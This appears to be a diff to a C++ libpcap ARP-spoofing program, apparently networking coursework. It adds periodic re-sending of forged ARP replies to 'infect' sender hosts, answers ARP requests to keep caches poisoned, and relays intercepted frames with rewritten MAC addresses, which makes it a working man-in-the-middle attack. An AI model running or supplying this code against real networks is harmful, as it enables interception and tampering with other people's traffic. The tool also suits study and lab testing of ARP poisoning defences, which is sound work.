@@ -7,7 +7,9 @@
 
 #include "ethhdr.h"
 #include "arphdr.h"
-#include <iostream>
+
+
+#define infect_frequency 10
 
 
 #pragma pack(push, 1)
@@ -57,6 +59,7 @@ int main(int argc, char* argv[]) {
 		usage();
 		return -1;
 	}
+
 
 	//pcap handle
 	char* dev = argv[1];
@@ -134,35 +137,43 @@ int main(int argc, char* argv[]) {
 	
 	//infect senders
 	for(int i=2; i<argc; i+=2){	//send arp packet
-		for(int j=0; j<5; j++)
-			send_arp(Macs[i], my_Mac, ArpHdr::Reply, my_Mac, htonl(Ip(argv[i+1])), Macs[i], htonl(Ip(argv[i])));
+		send_arp(Macs[i], my_Mac, ArpHdr::Reply, my_Mac, htonl(Ip(argv[i+1])), Macs[i], htonl(Ip(argv[i])));
 	}
 	
 	
 	//relay packet
+	int cnt = infect_frequency;
 	while(1){
+		if(cnt==0){	//infect senders periodically
+			for(int i=2; i<argc; i+=2){
+				send_arp(Macs[i], my_Mac, ArpHdr::Reply, my_Mac, htonl(Ip(argv[i+1])), Macs[i], htonl(Ip(argv[i])));
+			}
+			cnt = infect_frequency;
+			fprintf(stdout, "send: periodical arp\n");
+		}
+		cnt--;
+	
 		struct pcap_pkthdr* header;
 		const u_char* packet;
 		int res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			fprintf(stderr, "error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			break;
 		}
 		
 		EthHdr* ether = (EthHdr*)packet;
-		if(ether->type_ == htons(EthHdr::Arp)){
+		if(ether->type_ == htons(EthHdr::Arp)){	//reply to arp request
 			ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
 			if(arp->op_ == htons(ArpHdr::Request)){
 				send_arp(ether->smac_, my_Mac, ArpHdr::Reply, my_Mac, arp->tip_, arp->smac_, arp->sip_);
+				fprintf(stdout, "send: reply to arp request\n");
 			}
 		}
-		else{
-			
-					fprintf(stderr, "as\n");
+		else{	//check src mac and relay packet
 			for(int i=2; i<argc; i+=2){
-				if(ether->smac_ == Macs[i] && ether->dmac_ == my_Mac){
-					fprintf(stderr, "asdf\n");
+				if(ether->smac_ == Macs[i]){
+					fprintf(stdout, "send: relay %s to %s\n", argv[i], argv[i+1]);
 					ether->smac_ = my_Mac;
 					ether->dmac_ = Macs[i+1];
 					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), header->caplen);
